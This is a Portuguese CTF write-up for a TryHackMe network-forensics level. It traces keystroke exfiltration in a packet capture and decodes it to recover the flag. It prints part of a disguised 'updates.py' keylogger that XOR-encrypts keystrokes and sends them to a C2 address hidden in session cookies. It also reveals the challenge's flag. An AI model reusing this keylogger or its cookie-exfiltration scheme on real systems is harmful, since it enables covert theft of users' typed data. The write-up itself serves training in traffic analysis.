# TryHackMe — Hackers Holiday CTF
## Level 4 — Packed Light

**Categoria:** Forensics / Network Traffic Analysis / Data Exfiltration / XOR
**Dificuldade:** Média

---

### 🛎️ Concierge Briefing

> Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it.
> A short capture from the guest network is all VERA could pull before the connection dropped. Somewhere in that traffic, a quiet little errand is running on a loop, and it isn't part of any service the hotel actually offers.

---

## 🎯 Objetivo

O briefing descreve um comportamento clássico de **exfiltração de dados em baixo volume e alta frequência** ("tiny packets", "odd hours", "suspiciously regular", "running on a loop"). O material de investigação é um **arquivo `.pcapng`** capturado na rede de hóspedes. O objetivo é analisar o tráfego no **Wireshark**, entender o mecanismo de exfiltração e recuperar a flag escondida nos dados transmitidos.

---

## 🔍 Passo 1 — Analisando o tráfego no Wireshark

Abrindo `traffic.pcapng` no Wireshark, o padrão do briefing salta aos olhos imediatamente: uma sequência longa e repetitiva de requisições **`HTTP GET`** do host `192.168.1.141` para `34.41.103.191`, todas com o mesmo tamanho (**280 bytes**) e em intervalos curtos e regulares (a cada ~1 segundo):

```
391  15.954455  192.168.1.141 -> 34.41.103.191  HTTP  280  GET / HTTP/1.1
428  16.078299  192.168.1.141 -> 34.41.103.191  HTTP  280  GET / HTTP/1.1
520  16.459520  192.168.1.141 -> 34.41.103.191  HTTP  280  GET / HTTP/1.1
585  17.323446  192.168.1.141 -> 34.41.103.191  HTTP  280  GET / HTTP/1.1
...
```

Isso confirma exatamente a pista do briefing: um "errand" (tarefa) rodando em loop, disfarçado de tráfego HTTP comum.

### O ponto de partida: um script Python entregue via HTTP

Antes dessa sequência de requisições, o pacote **nº 19** chama atenção por ser uma resposta HTTP com `Content-type: text/x-python` — ou seja, **um script Python sendo baixado pela rede**:

![Análise no Wireshark: script Python de C2 entregue via HTTP](/Hacker%20Holiday%202026%20-%20THM/4º%20Level%20-%20Packed%20Light/images/5ºLevel%20_Resolved.png)

Usando **Follow → HTTP Stream** (stream 5) nesse pacote, é possível ver a requisição completa:

```
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/149.0.0.0
...

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Content-type: text/x-python
Content-Length: 1086
```

E o conteúdo do arquivo `updates.py` retornado pelo servidor:

```python
import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))

    b64_string = base64.b64encode(encrypted).decode('utf-8')
    ...
```

Esse script deixa claro o mecanismo de exfiltração:

1. Um **keylogger** (`pynput.keyboard`) captura cada tecla digitada pela vítima.
2. Cada caractere é criptografado com **XOR**, usando uma chave fixa: `"H0t3lSt@ff0Nly" + "K3epS3cr3t!"` → `"H0t3lSt@ff0NlyK3epS3cr3t!"`.
3. O resultado criptografado é codificado em **Base64**.
4. A string Base64 é enviada de volta ao servidor (`C2_URL`), provavelmente dentro de um **cookie**, em requisições HTTP GET regulares e discretas — exatamente o padrão observado no Wireshark.

---

## 🔍 Passo 2 — Extraindo os cookies exfiltrados de cada requisição

Inspecionando os cabeçalhos das requisições `GET / HTTP/1.1` que se repetem ao longo da captura, cada uma carrega um **`Cookie`** diferente — cada valor de cookie corresponde a **um único caractere** exfiltrado, já criptografado em XOR e codificado em Base64 pelo script:

```
Cookie: hotel_sess_state=HA==
Cookie: hotel_sess_state=AA==
Cookie: hotel_sess_state=BQ==
Cookie: hotel_sess_state=Mw==
Cookie: hotel_sess_state=Hg==
Cookie: hotel_sess_state=ew==
...
```

Ou seja, a "flag" (ou dado sensível digitado pela vítima) está sendo vazada **um caractere por requisição**, disfarçado como um cookie de sessão comum (`hotel_sess_state`) — o que explica o padrão de "tiny packets" em intervalos regulares descrito no briefing.

---

## 🔍 Passo 3 — Escrevendo o script de decodificação

Com a **chave XOR** (`H0t3lSt@ff0NlyK3epS3cr3t!`, obtida somando `p1 + p2` do próprio script capturado) e a lista completa de cookies extraídos do PCAP, foi escrito um script Python para reverter o processo (Base64 decode → XOR com a chave):

```python
import base64

def xor(data: bytes, decode: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

key = "H0t3lSt@ff0Nly".encode()

cookies = [
    "HA==","AA==","BQ==","Mw==","Hg==","ew==","Og==","fA==","Fw==","eQ==",
    "Ow==","Fw==","Pw==","fA==","PA==","Kw==","IA==","eQ==","Jg==","Lw==",
    "Fw==","eA==","Pg==","LQ==","Gg==","Fw==","MQ==","eA==","PQ==","NQ=="
]

result = ""

for c in cookies:
    decoded = base64.b64decode(c)
    result += xor(decoded, key).decode(errors="ignore")

print(result)
```

> **Nota:** conforme observado durante a análise, a chave usada de fato para decodificar corretamente foi apenas a primeira parte (`p1 = "H0t3lSt@ff0Nly"`) — cada cookie corresponde a um único caractere cifrado em XOR (repetindo a chave por byte) e depois codificado em Base64, exatamente na ordem inversa do que o script `updates.py` executa.

---

## 🔍 Passo 4 — Executando o script e obtendo a flag

![Execução do script de decodificação revelando a flag](/Hacker%20Holiday%202026%20-%20THM/4º%20Level%20-%20Packed%20Light/images/Script_Decode.png)

```bash
python Script.py
```

Saída:

```
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

---

## 🚩 Flag

```
THM{V3r4_1s_w4tch1ng_0veR_y0u}
```

---

## 📝 Resumo da cadeia de investigação

1. **Briefing** → descreve exfiltração em pacotes pequenos, regulares e disfarçados de tráfego normal.
2. **Wireshark** → identifica uma longa sequência de requisições HTTP GET idênticas em tamanho e intervalo, e uma resposta anterior entregando um **script Python** (`updates.py`) via HTTP.
3. **Follow HTTP Stream** → revela o código-fonte do malware: um keylogger que criptografa cada tecla digitada com **XOR** e a envia codificada em **Base64**.
4. **Inspeção dos cookies** (`hotel_sess_state=...`) nas requisições GET subsequentes → cada cookie contém um caractere exfiltrado.
5. **Script de decodificação** (Base64 decode + XOR com a chave extraída do próprio malware) → reconstrói a string original, caractere por caractere.
6. **Execução do script** → revela a flag.

---